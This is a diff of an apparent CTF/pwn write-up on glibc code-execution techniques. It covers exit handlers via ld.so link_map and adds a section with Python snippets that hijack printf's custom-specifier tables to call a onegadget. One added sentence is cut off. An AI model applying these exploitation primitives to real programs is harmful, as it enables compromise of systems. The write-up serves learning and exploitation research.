@@ -156,9 +156,10 @@ if your gadget does not pass in a `GOT` entry, looks at this write-up, how to ch
 
 ### 2 - Targetting ld.so link_map structure.
 
-The prerequisite for this way to achieve code execution, is that the program must exits via `return`, or via `exit()` libc function.
-
-In the two cases, libc will execute `__run_exit_handlers()` function that will call any destructors function registered (also called `dtors`), and will cleanup various things before exiting.
+> The prerequisite for this way to achieve code execution, is that the program must exits via `return`, or via `exit()` libc function.
+>
+> In the two cases, libc will execute `__run_exit_handlers()` function that will call any destructors function registered (also called `dtors`), and will cleanup various things before exiting.
+>
 
 If the program exits via `_exit()` function  (which name starts with an underscore), the `exit` syscall will be directly called, and the exit handlers will not be executed. You can set a breakpoint in `__run_exit_handlers()`  to verify that it is executed at exit, in case you doubt..
 
@@ -361,3 +362,64 @@ write(libc.sym['_IO_2_1_stdout_'], bytes(fake))
 I used a simple gadget that increase `rdi` register and jump to `rcx` which contains system.
 
 this is the same path via `_IO_wfile_underflow` that we used in `byor`challenge from **Hack.lu** 2022 edition, which is described here --> [https://github.com/nobodyisnobody/write-ups/tree/main/Hack.lu.CTF.2022/pwn/byor](https://github.com/nobodyisnobody/write-ups/tree/main/Hack.lu.CTF.2022/pwn/byor)
+
+------
+
+#### 4 - Code execution via fake custom conversion specifiers 
+
+#### (`__printf_function_table` & `__printf_arginfo_table`)
+
+libc permits to register custom conversion specifiers for `printf` as explained here: [https://www.gnu.org/software/libc/manual/html_node/Customizing-Printf.html](https://www.gnu.org/software/libc/manual/html_node/Customizing-Printf.html)
+
+That means that the management of a chosen conversion specifier (for example `%s`,  or `%d`, or any specifier you want) will be made by a chosen function, that will be called when `printf` use that specifier.
+
+> Prerequisites:
+>
+> the program you are exploiting must use `printf` and a conversion specifier
+
+by overwriting a non NULL value to `__printf_function_table` and writing an entry in the table pointed by `__printf_arginfo_table` with a function address, that function will be called for managing the
+
+These function pointers are not mangled of course.
+
+the code that calls the function is in libc source file `stdio-common/printf-parsemb.c` (line 368)
+
+```c
+/* Get the format specification.  */
+  spec->info.spec = (wchar_t) *format++;
+  spec->size = -1;
+  if (__builtin_expect (__printf_function_table == NULL, 1)
+      || spec->info.spec > UCHAR_MAX
+      || __printf_arginfo_table[spec->info.spec] == NULL
+      /* We don't try to get the types for all arguments if the format
+         uses more than one.  The normal case is covered though.  If
+         the call returns -1 we continue with the normal specifiers.  */
+      || (int) (spec->ndata_args = (*__printf_arginfo_table[spec->info.spec])
+                                   (&spec->info, 1, &spec->data_arg_type,
+                                    &spec->size)) < 0)
+```
+
+you can see that `spec->info.spec` is the current conversion specifier char.
+
+`__printf_function_table` must be non NULL
+
+and function in `__print_arginfo_table[]` is called like this: 
+
+```c
+__printf_arginfo_table[spec->info.spec])(&spec->info, 1, &spec->data_arg_type, &spec->size)
+```
+
+so `__printf_arginfo_table`  must point to a forged table,   we will create one just at `__printf_arginfo_table` as there are a lot of NULL vars around,
+
+and for example if we want to replace function for '%s' specifier, which is ascii 0x73, it's very simple:
+
+```python
+write(libc.sym['__printf_arginfo_table'], p64(libc.sym['__printf_arginfo_table']))
+write(libc.sym['__printf_arginfo_table']+0x73*8, p64(onegadget))	# 0x73 is 's'
+# activate it
+write(libc.sym['__printf_function_table'], p64(1) )
+```
+
+here we write a onegadget as the function handler for '%s'  that will be called when a `printf("%s")` is used.
+
+you can find an example of exploit in `exp_printf_table.py`  file.
+
